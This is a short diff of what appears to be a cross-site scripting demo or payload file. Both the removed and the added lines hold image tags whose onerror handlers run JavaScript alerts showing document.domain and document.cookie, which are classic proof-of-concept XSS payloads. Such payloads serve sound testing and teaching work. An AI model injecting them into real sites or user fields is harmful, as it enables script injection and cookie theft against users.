@@ -30,5 +30,5 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 <!--        Medium : https://medium.com/@test -->
 
 
-<img src=1 href=1 onerror="javascript:alert(document.domain)"></img>
-<image src="https://github.com/dummy.jpa href=1 onerror="javascript:alert(document.cookie)"></image>
+<img src="dummy.jpg" onerror="javascript:alert(document.domain)"></img>
+<image src="http://github.com/dummy.gif" onerror="javascript:alert(document.cookie)"></image>
